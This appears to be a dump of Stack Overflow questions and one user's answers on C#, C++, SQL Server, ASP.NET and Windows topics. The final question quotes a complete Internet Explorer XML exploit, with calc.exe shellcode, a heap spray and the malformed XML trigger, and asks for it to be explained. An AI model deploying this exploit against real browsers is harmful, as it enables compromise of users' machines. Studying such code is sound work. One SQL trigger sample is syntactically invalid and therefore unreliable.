<p>I have found out why my application was being treated as legacy despite including the above manifest.  It turns out a 2nd manifest was also being included which did not have the 'trustInfo' section.  I have removed this 2nd manifest and all is well now.</p>

<p>Thanks for all the help</p>
","33708","Mehrdad Afshari","<p>This is a feature of UAC to make old applications compatible with Vista. It redirects any request to write to a system folder that the user lacks permission to a local folder.</p>

<p>They are stored under ""AppData\Local\VirtualStore"" folder under the current user's profile.
There is a group policy setting to disable this feature: ""Virtualize file and registry write failures to per-user locations""</p>

<p>This file and registry virtualization features are designed to allow legacy applications to run under Windows Vista standard user accounts. Legacy application is defined as a 32-bit executable without a specific Vista manifest. If you provider a Vista manifest to decorate your application as Vista-compatible, this virtualization setting won't affect your application (as in your Wordpad example)</p>

<p>Mark Russinovich has a great article on this: <a href=""http://technet.microsoft.com/en-us/magazine/cc138019.aspx"" rel=""nofollow"">Inside Windows Vista User Account Control</a></p>
"
"<p>Don't be too hard on me!
Simply put:</p>

<p>foo.h:</p>

<pre><code>#include ""bar.h""
class foo {
private:
    bar it;
    void DoIt();
}
</code></pre>

<p>bar.h:</p>

<pre><code>class bar {
public:
    void Test();
}
</code></pre>

<p>foo.cpp:</p>

<pre><code>void foo::DoIt() {
    it.Test();
}
</code></pre>

<p>This will result in a:
error LNK2001: unresolved external symbol</p>

<p>Why?</p>
","33708","Mehrdad Afshari","<p>You have not written the code for <code>bar::Test()</code> method.</p>
"
"<p>I am fairly new to programming and while doing a lot of reading this concept of a lambda keeps coming up but I'm having a hard time putting my finger on what it actually is and how implementing it will make my programming life so much better.  So first, what is a lambda and second how might it be implemented?</p>

<p>Thanks to all who posted.  As has been mentioned in the comments, this is a duplicate, but there are so many great answers here I want to preserve them for the community so I'm turning it into a community post.  Here is the link to the other question:</p>

<p><a href=""http://stackoverflow.com/questions/16501/what-is-a-lambda-function"">http://stackoverflow.com/questions/16501/what-is-a-lambda-function</a></p>
","33708","Mehrdad Afshari","<p>A lambda is an inline description of a function. It has originated from functional programming languages and the number of other languages that support something like it is growing these days. The name comes from a mathematical thing called Lambda calculus which has influenced functional programming languages (such as Lisp) and the idea of lambdas come from it.</p>

<p>Your question depends on the programming language you're talking about. For instance, in F#, you would use <code>fun x -&gt; x * x</code> to represent </p>

<pre><code>int myfunction(int x) { return x * x; }
</code></pre>

<p>In C#, you would use <code>x =&gt; x * x</code> to represent the same function.
How it's used and what you can do with it pretty much depends on the language you are working in.</p>

<p>Talking about C#, the great thing about them is the ability to parse them as <i>expression trees</i>. A lambda expression can be used as a code, like a <b>delegate</b> (roughly a function pointer) or as data, in an expression tree. Using them as expression trees, make libraries such as LINQ to SQL to be able to use the expression to create a SQL statement in order to submit to server and get the appropriate results.</p>
"
"<p>As usual, when my brain's messing with something I can't figure out myself, I come to you guys for help :)</p>

<p>This time I've been wondering why stdafx.h works the way it does? To my understanding it does 2 things:</p>

<ul>
<li>Includes standard headers which we
<em>might</em> (?) use and which are rarely changed</li>
<li>Work as a compiler-bookmark for when
code is no longer precompiled.</li>
</ul>

<p>Now, these 2 things seems like two very different tasks to me, and I wonder why they didn't do two seperate steps to take care of them? To me it seems reasonable to have a #pragma-command do the bookmarking stuff and to optionally have a header-file a long the lines of windows.h to do the including of often-used headers... Which brings me to my next point: Why are we forced to include often-used headers through stdafx.h? Personally, I'm not aware of any often used headers I use that I'm not already doing my own includes for - but maybe these headers are necessary for .dll generation?</p>

<p>Thx in advance</p>
","33708","Mehrdad Afshari","<p>You are not forced to use ""stdafx.h"". You can check off the Use precompiled headers in project properties (or when creating the project) and you won't need <code>stdafx.h</code> anymore.</p>

<p>The compiler uses it as a clue to be able to precompile most used headers separately in a <code>.pch</code> file to reduce compilation time (don't have to compile it every time).</p>
"
"<p>Are there any open source real time operating systems out there?  I've heard of real-time Linux, but most implementations seem to really be a proprietary RTOS (that you have to pay for) that run Linux as a process -- much the same way Ardence's RTX real-time system works for Windows.</p>

<p>EDIT: I should clarify that I'm looking for RTOS to work with multi-core x86-family CPUs.  </p>
","33708","Mehrdad Afshari","<p>Check out <a href=""http://ecos.sourceware.org/"" rel=""nofollow"">eCos</a> free, open source and real-time operating system. (Supports x86, not sure about multi-core)</p>

<p><a href=""http://www.rtlinuxfree.com/"" rel=""nofollow"">RTLinux</a> is also available</p>
"
"<p>Does there exist any way in .Net to check before opening if a file (on a local network drive) is already in use?</p>
","33708","Mehrdad Afshari","<p>You should try to access it and if it failed, you either don't have required permissions (which you can check with GetAccessControl) or it's locked by another process.</p>

<p>But I don't think there is any reliable measure to distinguish a lock and a permission failure (since you might be able to read the file, but not able to check the permissions). Even Windows' error message says you either don't have permission or it's being used by another process.</p>

<p>You can use WMI <code>CIM_DataFile</code> class to query <code>InUseCount</code> for a specified data file.</p>

<p>If you're looking for a programmatical equivalent to <code>lsof</code> utility in Linux, to find out all open files by a given <b>local</b> process, you could try using <code>Win32_Process</code> WMI class through <code>System.Management</code> namespace. You could issue a WMI query to look up the file name in all open files being used by all local processes too see if it's there or not. Alternatively, you could P/Invoke and use <code>NtQuerySystemInformation</code> API directly to accomplish the same task.</p>
"
"<p>I understand that boxing and unboxing is about casting (real type to object... object to real type). But I do not understand what the MSDN say about it with the Nullable. Here is the text I do not understand:</p>

<blockquote>
  <p>When a nullable type is boxed, the common language runtime automatically boxes the underlying value of the Nullable object, not the Nullable object itself. That is, if the HasValue property is true, the contents of the Value property is boxed. When the underlying value of a nullable type is unboxed, the common language runtime creates a new Nullable structure initialized to the underlying value. <a href=""http://msdn.microsoft.com/en-us/library/b3h38hb0.aspx"">Source</a></p>
</blockquote>

<p>When you change your object to a real type, the real type variable that was nullable will be the type of object? I do not get it?</p>
","33708","Mehrdad Afshari","<p>If a <code>Nullable&lt;T&gt;</code> is <code>null</code>, it'll be boxed as a null reference and will not behave as a boxed value type with <code>HasValue = true</code>.</p>

<p>In fact, to implement this feature, it was required that CLR intrinsically support <code>Nullable&lt;T&gt;</code> type and treat it differently. Developers can not write their own type that works like <code>Nullable&lt;T&gt;</code>.</p>

<p>It's worth noting that this was one of the late .NET 2.0 features. In early betas, <code>Nullable&lt;T&gt;</code> behaved just like a normal structure. In final release, it was changed to box to null reference. This change was specifically breaking for SQL Server CLR team and they had to change some fundamental stuff for it.</p>
"
"<p>I understand the best way to count the number of rows in an SQL table is count(*) (or equivalently count(PrimaryKey)).</p>

<ol>
<li>Is this O(1)?</li>
<li>If not, why not?</li>
</ol>

<p>Why not just implement a counter and return it for this specific query? Is it because this query is not a common use case?</p>

<p>If the answers vary according to SQL engine, I'd like to hear the differences - but in any case, I'm interested in the actual implementation in production SQL engines.</p>
","33708","Mehrdad Afshari","<p>It's normally O(N).</p>

<p>If O(1) response to such query is needed, you can easily accomplish it either using:</p>

<ul>
<li>An indexed view that counts the query.</li>
<li>Store count manually in another table and update the row count using a trigger:</li>
</ul>

<p>Example:</p>

<pre><code>CREATE TABLE CountingTable ( Count int )

INSERT CountingTable VALUES(0)

CREATE TRIGGER Counter ON Table FOR INSERT, UPDATE, DELETE AS
BEGIN
   DECLARE @added int, @Removed int
   SET @added = SELECT COUNT(*) FROM inserted
   SET @removed = SELECT COUNT(*) FROM deleted
   UPDATE CountingTable SET Count = Count + @added - @removed
END
</code></pre>
"
"<p>I recently had a problem in my app where some of the subviews I was creating in a UIViewController subclass's  <code>-awakeFromNib</code> method were disappearing from the view. After some poking around I found that moving the code I had put in <code>-awakeFromNib</code> to <code>-viewDidLoad</code> solved the problem. Seems that <code>-awakeFromNib</code> gets called only once when the UIViewController is unarchived from the nib, and <code>-viewDidLoad</code> gets called every time the view is unarchived.</p>

<p>So what's the best practice? It looks like UIViewController's <code>-awakeFromNib</code> shouldn't be adding any views to the view, that kind of stuff should be done in <code>-viewDidLoad</code>. Am I understanding this correctly? Or am I more confused than I thought?</p>
","33708","Mehrdad Afshari","<p>Yes, it's correct. You shouldn't really rely on <code>awakeFromNib</code> to do that kind of tasks.</p>

<p><code>awakeFromNib</code> is similar to an event that's called after deserialization in .NET. <code>viewDidLoad</code> is similar to <code>Load</code> event in .NET. </p>

<p>If you are familiar with the concepts from .NET, this should be enough, I think.</p>
"
"<p>I am using the following methods:</p>

<pre><code>public void M1(Int32 a)
{
  // acquire MyMutex
  DoSomething(a);
  // release MyMutex
}
</code></pre>

<p>and</p>

<pre><code>public void M2(String s, String t)
{
  // acquire MyMutex
  DoSomethingElse(s, t);
  // release MyMutex
}
</code></pre>

<p>From what I have found so far it seems that it is not possible to use a single delegate for two methods with different signatures.</p>

<p>Are there any other alternatives to write something like this:</p>

<pre><code>public void UsingMutex(...)
{
  // acquire MyMutex
  ...
  // release MyMutex
}

UsingMutex(M1);
UsingMutex(M2);
</code></pre>

<p>All I can think for the moment is to use two delegates and a boolean flag to know which delegate to call, but it is not a long term solution.</p>

<p>It is possible to combine generics with delegates? And if so, do you have some links for any kind of documentation?</p>

<p>Environment: C# 2.0</p>
","33708","Mehrdad Afshari","<p>Yes, it's possible to combine generics with delegates.</p>

<pre><code>public delegate void Action&lt;T&gt;(T x);
public delegate void Action&lt;T,U&gt;(T x, U y);

public void UsingMutex&lt;T&gt;(Action&lt;T&gt; x, T t) {
    // acquire mutex...
    x(t);
    // release mutex...
}
public void UsingMutex&lt;T,U&gt;(Action&lt;T,U&gt; x, T t, U u) {
    // acquire mutex...
    x(t, u);
    // release mutex...
}
</code></pre>

<p>But you still have to handle different number of parameters using overloads.</p>
"
"<p>Using the code below, I am returning an nvarchar field from ms sql 05 and keep getting a System.InvalidCastException.</p>

<pre><code>vo.PlacementID = dr.IsDBNull(0) ? null : dr.GetString(0);
</code></pre>

<p>The vo.PlacementID variable is of type String so there shouldn't be a problem.
The values I am trying to return are like this (number, number, letter): 00F, 02A, 01F etc </p>

<p>System.InvalidCastException: Unable to cast object of type 'System.Int32' to type 'System.String'.
at System.Data.SqlClient.SqlBuffer.get_String()
at System.Data.SqlClient.SqlDataReader.GetString(Int32 i)</p>

<p>Any help much appreciated.</p>
","33708","Mehrdad Afshari","<p>The <code>InvalidCastException</code> isn't raised because of the type incompatibility between the <code>PlacementID</code> property and <code>string</code>. If that was the case, you'd get a compile-time error. The problem is the first field in the result set is not a <code>string</code>, it's something else.</p>
"
"<p>I am trying to get the size of an array populated by stdin:</p>

<pre><code>char *myArray;
cin &gt;&gt; myArray
cout &lt;&lt; sizeof(myArray);
</code></pre>

<p>This returns 4 when I enter a string greater with a length greater than 4 e.g. ""40905898""</p>

<p>Where am i going wrong?</p>
","33708","Mehrdad Afshari","<p><code>sizeof</code> operator statically evaluates to the size of the thing you are passing to it. A <code>char*</code> is a pointer which, depending on the machine architecture has a specific size (4 bytes on 32 bit systems and 8 bytes on 64 bit machines). To accomplish what you are trying to do, I suggest you use the <code>string</code> type which you can use by adding <code>#include &lt;string&gt;</code> along with <code>using namespace std;</code> to your source file.</p>

<pre><code>string line;
cin &gt;&gt; line;
cout &lt;&lt; line.length() &lt;&lt; endl;
</code></pre>

<p>It's less error prone and easier to use.</p>

<p>By the way, the thing you've tried to do is really dangerous. In fact, when you use <code>cin &gt;&gt; myArray</code>, you should have already allocated some memory for <code>myArray</code> which you haven't done. This will cause memory corruption which might crash your program and possibly put it to buffer overrun attacks.</p>

<p>A simple array in C++ has no idea about its size. You can use <code>sizeof</code> <b>only if the array is statically allocated</b> and you are using <code>sizeof</code> on the array itself, not another pointer to it, for example this won't work as you might expect:</p>

<pre><code>int x[5];
int *a = &amp;x[0];
// a[i] is now the same as x[i] but:
cout &lt;&lt; sizeof(x) &lt;&lt; endl; // prints 20, assuming int is 32 bits long
cout &lt;&lt; sizeof(a) &lt;&lt; endl; // prints 4, assuming a pointer is 32 bits long
</code></pre>

<p>Note that the total size of the array is printed on the first line, not the element count. You can use <code>sizeof(x)/sizeof(*x)</code> to find out element count in static arrays. This thing is not possible for dynamically allocated arrays using <code>new</code>. In fact C++ arrays are very error prone and you should take extreme care when working with them and you'd better use <code>vector</code> and <code>string</code> in most cases instead.</p>
"
"<p>Is there any performance penalty for the following code snippet?</p>

<pre><code>for (int i=0; i&lt;someValue; i++)
{
    Object o = someList.get(i);
    o.doSomething;
}
</code></pre>

<p>Or does this code actually make more sense?</p>

<pre><code>Object o;
for (int i=0; i&lt;someValue; i++)
{
    o = someList.get(i);
    o.doSomething;
}
</code></pre>

<p>If in byte code these two are totally equivalent then obviously the first method looks better in terms of style, but I want to make sure this is the case.</p>
","33708","Mehrdad Afshari","<p>The first code is better as it restricts scope of <code>o</code> variable to the <code>for</code> block. From a performance perspective, it might not have any effects in Java, but it might have in lower level compilers. They might put the variable in a register if you do the first.</p>

<p>In fact, some people might think that if the compiler is dumb, the second snippet is better in terms of performance. This is what some instructor told me at the college and I laughed at him for this suggestion! Basically, compilers allocate memory on the stack for the local variables of a method just once at the start of the method (by adjusting the stack pointer) and release it at the end of method (again by adjusting the stack pointer, assuming it's not C++ or it doesn't have any destructors to be called). So all stack-based local variables in a method are allocated at once, no matter where they are declared and how much memory they require. Actually, if the compiler is dumb, there is no difference in terms of performance, but if it's smart enough, the first code can actually be better as it'll help the compiler understand the scope and the lifetime of the variable! By the way, if it's really smart, there should no absolutely no difference in performance as it infers the actual scope.</p>

<p>Construction of a object using <code>new</code> is totally different from just declaring it, of course.</p>

<p>I think readability is more important that performance and from a readability standpoint, the first code is definitely better.</p>
"
"<p>How to truncate and shrink large log files in SQL Server 2005? How to apply truncation at regular intervals?</p>

<p>Is there any difference between truncation and shrinking?</p>

<p>Thanks in advance</p>
","33708","Mehrdad Afshari","<p>Use the <code>DBCC SHRINKFILE</code> statement.</p>
"
"<p>Given a string S, what is the best algorithm to find a substring which repeats maximum number of times.</p>

<p>For example, in ""assdssfssd"", it is ""ss"" which repeats maximum number of times.</p>
","33708","Mehrdad Afshari","<pre><code>// C# code, finds one of the most occurred non-empty substrings in O(n), proof by the reader!
int[] x = new int[65536];
foreach (char c in myString)
     x[(int)c]++;
int max = 0;
for (int i = 0; i &lt; x.Length; ++i)
    if (x[max] &lt; x[i])
        max = i;
return ((char)max).ToString();
</code></pre>

<p>This probably isn't what you want, though. You might need to look at something like Huffman coding...</p>
"
"<p><a href=""http://sseplus.sourceforge.net"" rel=""nofollow"">SSEPlus</a> is an open source library from AMD for unified handling of <a href=""http://en.wikipedia.org/wiki/Streaming_SIMD_Extensions"" rel=""nofollow"">SSE</a> processor extensions.</p>

<p>I'm considering to use this library for my next small project and would like to know, if anybody have experience with it? Can I use it on Intel machines? Any performance issues in comparison to direct SSE calls? Any issues on 64bit machines? What other projects than <a href=""http://framewave.sourceforge.net"" rel=""nofollow"">Framewave</a> use it?</p>
","33708","Mehrdad Afshari","<p>Yes, you can use it on Intel machines too.</p>

<p>Performance should not differ except that it adds the checks about supported processor features which might cost a little. </p>
"
"<p>How can I make a Property ""ReadOnly"" outside the Assembly (DLL) for people using the DLL but still be able to populate that property from within the assembly for them to read?</p>

<p>For example, if I have a <strong>Transaction</strong> object that needs to populate a property in a <strong>Document</strong> object (which is a child class of the <strong>Transaction</strong> class) when something happens in the <strong>Transaction</strong> object, but I just want to developer using my DLL to only be able to read that property and not change it (it should only be changed from within the DLL itself).</p>
","33708","Mehrdad Afshari","<p>C#</p>

<pre><code>public object MyProp {
   get { return val; }
   internal set { val = value; }
}
</code></pre>

<p>VB</p>

<pre><code>Public Property MyProp As Object
   Get
      Return StoredVal
   End Get
   Friend Set(ByVal value As Object) 
      StoredVal = value
   End Set
End Property
</code></pre>
"
"<p>I restored my development database from production, and the stored procedures I need in my development environment doesn't exist in my production database.  Is there a command Ii can use to import the developmetn stored procedures back into SQL Server.  There are about 88 files, as each procedure is in a different text file.</p>

<p>TIA!
Chris</p>
","33708","Mehrdad Afshari","<p>Oops, you did the painful way of generating scripts. You should have created a single script for all procedures by right clicking on the database in SSMS, choosing Tasks -> Generate Scripts.</p>

<p>However, if you don't want to go through that process again, open up a cmd shell in the folder and remember those old batch file days:</p>

<pre><code>for %f in (*.sql) do sqlcmd -i %f
</code></pre>

<p>This should do the trick!
You could add other parameters to sqlcmd if required (i.e. login, password, server name, ...). To see a list of switches just do a <code>sqlcmd -h</code>.</p>
"
"<p>If you have two applications residing on the same server, can you use Server.Transfer to load a page in a different AppDomain/Application?</p>

<p>My guess is no, because Server.Transfer() copies HttpContext.Items, among other things. To copy this data between AppDomains, would cause threading and memory sharing concerns a in a world were thread isolation is strictly enforced. </p>

<p>Thoughts?</p>
","33708","Mehrdad Afshari","<p>Nope, it's not possible.</p>

<p><code>Server.Transfer</code> and <code>Server.Execute</code> cannot be used in these scenarios.</p>

<p>It does not, however, copy the <code>HttpContext.Items</code>. It's not copied. The same <code>HttpContext</code> is reused.</p>
"
"<p><code>String.length</code> will only tell me how many characters are in the String.  (In fact, before Ruby 1.9, it will only tell me how many bytes, which is even less useful.)</p>

<p>I'd really like to be able to find out how many 'en' wide a String is.  For example:</p>

<pre><code>'foo'.width
# =&gt; 3

'moo'.width
# =&gt; 3.5          # m's, w's, etc. are wide

'foi'.width
# =&gt; 2.5          # i's, j's, etc. are narrow

'foo bar'.width
# =&gt; 6.25         # spaces are very narrow
</code></pre>

<p>Even better would be if I could get the first <code>n</code> en of a String:</p>

<pre><code>'foo'[0, 2.en]
# =&gt; ""fo""

'filial'[0, 3.en]
# =&gt; ""fili""

'foo bar baz'[0, 4.5en]
# =&gt; ""foo b""
</code></pre>

<p>And better still would be if I could strategize the whole thing.  Some people think a space should be 0.25en, some think it should be 0.33, etc.</p>
","33708","Mehrdad Afshari","<p>It depends on the font used. If you use a fixed width font, it'll be equal to length. If you use other fonts, it'll be something else. Any such function would have to depend on the font used for rendering.</p>
"
"<p>Why is that Web Service files (.asmx) have their code-behind placed in app_code folder by default unlike the regular .aspx files?</p>
","33708","Mehrdad Afshari","<p>When you work with Web site projects, this is the style Visual Studio uses. It's not the case with Web application projects.</p>
"
"<p>i want ask some question about asp.net mvc</p>

<ol>
<li>Is static constructor will init every user request?</li>
<li>Is static data share for every user?</li>
</ol>
","33708","Mehrdad Afshari","<p>This answer is completely generic and not only for ASP.NET MVC.</p>

<ol>
<li><p>Static constructors will run at most once per application domain. It's guaranteed that it's run before any static or instance member access for that class. So no, it won't be called for every request.</p></li>
<li><p>Yes, static data is shared through the whole application domain. Every application domain will have distinct static data. So unless you are running on a Web garden or Web farm scenario, it's shared for all users. <i>Side note: If you declare your static fields as <code>ThreadStatic</code>, they will only be available for a single thread, which probably doesn't make much sense in an ASP.NET application.</i></p></li>
</ol>
"
"<p>How to hide controller name in Url?</p>

<p>I use the ASP.NET MVC.</p>

<p>The original url is:  <a href=""http://www.sample.com/Users.mvc/UserDetail/9615"" rel=""nofollow"">http://www.sample.com/Users.mvc/UserDetail/9615</a></p>

<p>The ""Users"" is controller name, the ""UserDetail"" is action name, and the ""9615"" is UserId.</p>

<p>How can I hide the controller name and action name in the url. </p>

<p>Just like this: <a href=""http://www.sample.com/9615"" rel=""nofollow"">http://www.sample.com/9615</a></p>

<p>I have writed the following code in the Global.ascx.cs to hide the action name:</p>

<pre><code>routes.MapRoute(
             ""UserDetail"",             // Route name
             ""Users.mvc/{UserId}"",              // URL with parameters
             new { controller = ""Users"", action = ""UserDetail"", UserId = """" }  // Parameter defaults
            );
</code></pre>

<p>Using the above code I hid the action name and got this url: <a href=""http://www.sample.com/Users.mvc/9615"" rel=""nofollow"">http://www.sample.com/Users.mvc/9615</a></p>

<p>But how can I hide the controller name and get this url:  <a href=""http://www.sample.com/9615"" rel=""nofollow"">http://www.sample.com/9615</a></p>

<p>Thanks.</p>
","33708","Mehrdad Afshari","<p>The idea is the same. You do just the thing you did to the action. However, your problem arises from the fact that IIS is probably not mapping www.xyz.com/1234 to ASP.NET runtime. To do so in IIS7, enable integrated mode and in IIS6, add a wildcard mapping in handler map that maps everything to ASP.NET.</p>

<p>To add a wildcard map, see <a href=""http://haacked.com/archive/2008/11/26/asp.net-mvc-on-iis-6-walkthrough.aspx"" rel=""nofollow"">http://haacked.com/archive/2008/11/26/asp.net-mvc-on-iis-6-walkthrough.aspx</a> (Search for ""IIS6 Extension-less URLs"" in that page)</p>

<p>After that, simply add a route:</p>

<pre><code>routes.MapRoute(""UserDetails"", ""{UserID}/{*name}"", 
    new { controller = ""Users"", action = ""UserDetail"" , UserID=""""});
</code></pre>

<p>This should do the trick.</p>
"
"<p>Im using vs2008 and Im also using the autogenerated object model / entity classes from linq to sql (.dbml).</p>

<p>Is it possible / recommended to change the autogenerated .cs file. Eg change the behaviour of Equals (in the partical class Courses)?</p>

<p>I do know that Equals should be reflexive, symmetric, transitive, consistent and ""Equals(null)== false ""</p>
","33708","Mehrdad Afshari","<p>It's not suggested to change the generated file directly as it will be regenerated and overwrite your changes if you edit the DBML. The generated classes will be declared as <code>partial</code> so you can change them by creating another file and declaring a <code>partial</code> class with the same name and adding your changes there.</p>
"
"<p>I am looking into building an <strong>authentication</strong> in my ASP.NET application with the following requirements.</p>

<ul>
<li>A user has exactly one Role (i.e. Admin, SalesManager, Sales, ....)</li>
<li>A role has a set of permissions to CRUD access a subset of existing objects. I.e.
""Sales has CREAD, READ, WRITE permission on object type ""Products"" but not DELETE""</li>
<li>Somehow I like the permissions to be in a hierarchy with inheritance so that I for i.e. Admin don't need to specify all available objects. </li>
<li>The system must quickly be able to answer the question ""Does user X have permission to do Y to object Z""</li>
<li>All database managed (MSSQL), implemented in C#/ASP.NET</li>
</ul>

<p>I would like to get feedback on these requirements? Any ideas how to implement this using ASP.NET framework(as much as possible)? (However, I'm also interested to know how this can be achieved without Memberships)</p>
","33708","Mehrdad Afshari","<p>The membership API provided since ASP.NET 2.0 should suit your requirements well. The only thing I'm afraid it doesn't directly support is hierarchical roles. However you can easily use normal role based security with another manually written hierarchical roles table to achieve the required things.</p>
"
"<p>I have a bash file that contains wget commands to download over 100,000 files totaling around 20gb of data.</p>

<p>The bash file looks something like:</p>

<p>wget <a href=""http://something.com/path/to/file.data"" rel=""nofollow"">http://something.com/path/to/file.data</a></p>

<p>wget <a href=""http://something.com/path/to/file2.data"" rel=""nofollow"">http://something.com/path/to/file2.data</a></p>

<p>wget <a href=""http://something.com/path/to/file3.data"" rel=""nofollow"">http://something.com/path/to/file3.data</a></p>

<p>wget <a href=""http://something.com/path/to/file4.data"" rel=""nofollow"">http://something.com/path/to/file4.data</a></p>

<p>And there are exactly 114,770 rows of this. How reliable would it be to ssh into a server I have an account on and run this? Would my ssh session time out eventually? would I have to be ssh'ed in the entire time? What if my local computer crashed/got shut down?</p>

<p>Also, does anyone know how many resources this would take? Am I crazy to want to do this on a shared server?</p>

<p>I know this is a weird question, just wondering if anyone has any ideas. Thanks!</p>
","33708","Mehrdad Afshari","<p>Depends on the reliability of the communication medium, hardware, ...!</p>

<p>You can use <code>screen</code> to keep it running while you disconnect from the remote computer.</p>
"
"<p>Assume I allow the user to input a arbitrary numerical expression that allows usage of the explicit set of functions and predefined variables.</p>

<p>Interpreting this is pretty straight forward but what if performance is a critical factor?</p>

<p>I need a way to compile (in runtime) a string with a expression into something that can be executed 20K times with different values on the variables.</p>
","33708","Mehrdad Afshari","<p>In C# 4.0, it'll become very easy and straightforward. However, before C# 4.0, I suggest you use <code>Microsoft.JScript</code> libraries to accomplish it.</p>

<p>This is all you want: <a href=""http://www.odetocode.com/Articles/80.aspx"" rel=""nofollow"">http://www.odetocode.com/Articles/80.aspx</a></p>
"
"<p>I'm getting the error below when trying to loop through a listbox and then remove the item.</p>

<blockquote>
  <p>List that this enumerator is bound to has been modified. An enumerator can only be used if the list does not change.</p>
</blockquote>

<pre><code>foreach (string s in listBox1.Items)
{
    MessageBox.Show(s);
    //do stuff with (s);
    listBox1.Items.Remove(s);
}
</code></pre>

<p>How can I remove the item and still loop through the contents?</p>
","33708","Mehrdad Afshari","<pre><code>for (int i = 0; i &lt; listBox1.Items.Count; ++i)
{
   // ...
   listBox1.Items.RemoveAt(i--);
}
</code></pre>
"
"<p>How does operating system know what filesystem a partition is using?  In other words, how are FAT16/32, NTFS, ext2/3 etc. distinguished from each other?</p>
","33708","Mehrdad Afshari","<p>About every filesystem has some header information which is called ""superblock."" Superblocks contain magic numbers or other info about the type of filesystem.</p>

<p>MBR partition table also stores a 8 bit value representing the partition type.</p>
"
"<p>I have a JPEG ""image"" (actually a BLOB in a database) which I want to import/convert into a ""Bitmap"" structure in memory. The reason is that I use a third party library which is unable to work with JPEG images and I need to pass an uncompressed bitmap (as a pointer). All I found so far are ways to convert between different formats on disk but saving the image as bitmap first and re-import it will take far too long. </p>

<p>I don't know much about .NET but I think a System.Drawing.Bitmap should be able to hold the uncompressed data. I'm working with C# and Visual Studio 2008. </p>
","33708","Mehrdad Afshari","<pre><code>// blob is a byte[] retrieved from DB
Bitmap bmp = new Bitmap(new MemoryStream(blob));
</code></pre>
"
"<p>I have created an asp.net website that connects to a SQL server database. Currently on my development machine I have the connection set to a SQL server express database with the file residing in the App_Data file of the website.</p>

<p>I now need to upload the site to my host of which I have an SQL server database set up. They have provided me with the name of the SQL server database - <strong>mssql.mydomain.com</strong> - but I'm not sure how to set up the connection string in the web.config file to point to this.</p>

<p>Any help would be much appreciated. - Thanks in advance.</p>
","33708","Mehrdad Afshari","<pre><code>Server=mssql.mydomain.com;uid=user_id_goes_here;pwd=password_goes_here
</code></pre>
"
"<p>I am looking at nServiceBus and came over this interface</p>

<pre><code>namespace NServiceBus
{
    public interface IMessage
    {
    }
}
</code></pre>

<p>What is the use of an empty interface?</p>
","33708","Mehrdad Afshari","<p>Normally it's similar to attributes. Using attributes is a preferred to empty interfaces (at least as much as FxCop is aware). However .NET itself uses some of these interfaces like <code>IRequiresSessionState</code> and <code>IReadOnlySessionState</code>. I think there is performance loss in metadata lookup when you use attributes that made them use interfaces instead.</p>
"
"<p>Closed as exact duplicate of <a href=""http://stackoverflow.com/questions/145856"">this question</a>.</p>

<p>I have an array/list of elements. I want to convert it to a string, separated by a custom delimitator. For example:</p>

<pre><code>[1,2,3,4,5] =&gt; ""1,2,3,4,5""
</code></pre>

<p>What's the shortest/esiest way to do this in c#?</p>

<p>I have always done this by cycling the list and checking if the current element is not the last one before adding the separator.</p>

<pre><code>for(int i=0; i&lt;arr.Length; ++i)
{
    str += arr[i].ToString();
    if(i&lt;arr.Length)
        str += "","";
}
</code></pre>

<p>Is there a LINQ function that can help me write less code?</p>
","33708","Mehrdad Afshari","<pre><code>String.Join("","", arr.Select(p=&gt;p.ToString()).ToArray())
</code></pre>
"
"<p>Are there any performance benchmarks for Mono compared to say Java in GNU/Linux?</p>

<p>Have you ever tested Mono's performance?</p>
","33708","Mehrdad Afshari","<p>I've seen one <a href=""http://shootout.alioth.debian.org/gp4/csharp.php"" rel=""nofollow"">http://shootout.alioth.debian.org/gp4/csharp.php</a></p>
"
"<p>I usually do not have difficulty to read JavaScript script but this one I can't figure out the logic. The code is from an Exploit that has been published 4 days ago. You can find it at <a href=""http://www.milw0rm.com/exploits/7477"">milw0rm</a>.</p>

<p>Here is the code:</p>

<pre><code>&lt;html&gt;
    &lt;div id=""replace""&gt;x&lt;/div&gt;
    &lt;script&gt;
        // windows/exec - 148 bytes
        // http://www.metasploit.com
        // Encoder: x86/shikata_ga_nai
        // EXITFUNC=process, CMD=calc.exe
        var shellcode = unescape(""%uc92b%u1fb1%u0cbd%uc536%udb9b%ud9c5%u2474%u5af4%uea83%u31fc%u0b6a%u6a03%ud407%u6730%u5cff%u98bb%ud7ff%ua4fe%u9b74%uad05%u8b8b%u028d%ud893%ubccd%u35a2%u37b8%u4290%ua63a%u94e9%u9aa4%ud58d%ue5a3%u1f4c%ueb46%u4b8c%ud0ad%ua844%u524a%u3b81%ub80d%ud748%u4bd4%u6c46%u1392%u734a%u204f%uf86e%udc8e%ua207%u26b4%u04d4%ud084%uecba%u9782%u217c%ue8c0%uca8c%uf4a6%u4721%u0d2e%ua0b0%ucd2c%u00a8%ub05b%u43f4%u24e8%u7a9c%ubb85%u7dcb%ua07d%ued92%u09e1%u9631%u5580"");

        // ugly heap spray, the d0nkey way!
        // works most of the time
        var spray = unescape(""%u0a0a%u0a0a"");

        do {
           spray += spray;
        } while(spray.length &lt; 0xd0000);

        memory = new Array();

        for(i = 0; i &lt; 100; i++)
           memory[i] = spray + shellcode;

        xmlcode = ""&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;![CDATA[&lt;image SRC=http://&amp;#x0a0a;&amp;#x0a0a;.example.com&gt;]]&gt;&lt;/C&gt;&lt;/X&gt;&lt;/XML&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;XML ID=I&gt;&lt;/XML&gt;&lt;SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML&gt;&lt;/SPAN&gt;&lt;/SPAN&gt;"";

        tag = document.getElementById(""replace"");
        tag.innerHTML = xmlcode;

    &lt;/script&gt;
&lt;/html&gt;
</code></pre>

<p>Here is what I believe it does and I would like you to help me for the part that I misunderstand.</p>

<p>The variable <code>shellcode</code> contain the code to open the calc.exe. I do not get it how they have found that weird string... any idea?</p>

<p>The second thing is the variable <code>spray</code>. I do not understand this weird loop?</p>

<p>The third thing is the variable <code>memory</code> that is never used anywhere, why do they create it?</p>

<p>Last thing, What does the XML tag do in the page?</p>

<h2>Update</h2>

<p>Alright, for the moment I have good answers but mostly very
general. I would like more explanations of the value of the
code. An example is <code>unescape(""%u0a0a%u0a0a"");</code>. What does it mean?
Same thing for the loop, why did the developer write:
<code>length &lt; 0xd0000</code>? I would like a deeper understanding, not
only the theory of this code.</p>
